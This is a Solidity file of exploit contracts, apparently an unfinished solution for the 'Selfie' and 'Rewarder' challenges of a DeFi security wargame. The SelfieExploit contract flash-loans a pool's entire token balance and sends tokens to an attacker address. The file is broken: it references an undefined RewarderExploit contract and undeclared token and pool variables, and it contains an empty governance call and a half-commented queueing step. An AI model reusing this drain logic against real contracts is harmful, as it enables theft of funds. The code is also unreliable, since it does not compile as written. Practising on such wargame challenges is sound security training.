
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";



interface ISelfiePool {
	function flashLoan(uint256 amount) external;
	function drainAllFunds(address receiver) external ;
}


contract RewarderExploitDeployer {
	constructor(address poolAddress, address rewardAddress, address attacker){
		RewarderExploit rewarderExploit = new RewarderExploit(poolAddress, rewardAddress, attacker);
		rewarderExploit.attack();
	}
}
contract SelfieExploit {
	ISelfiePool public selfiePool;
    address public attackerEOA;
	
	constructor (address poolAddress, address tokenAddress, address attacker) {
		selfiePool = ISelfiePool(poolAddress);
		attackerEOA = attacker;
        token = IERC20(tokenAddress);
		}
	
	function attack() external {
        uint256 amount = token.balanceOf(address(selfiePool));
        console.log(amount);
	 	selfiePool.flashLoan(amount);
        token.transfer(attackerEOA, amount);

    }
	function receiveTokens(address attackerEOA,uint256 amount) external {
		//unit256 actionId = selfiePool.queueAction(address(this),  abi.encodeWithSignature(
        //        "transfer                  (address,uint256)",
        //        address(this),
        //        balance
        //    )
        selfiePool.governance.executeAction(

        )
        pool.liquidityToken().transfer(address(pool),amount);
 
	}
}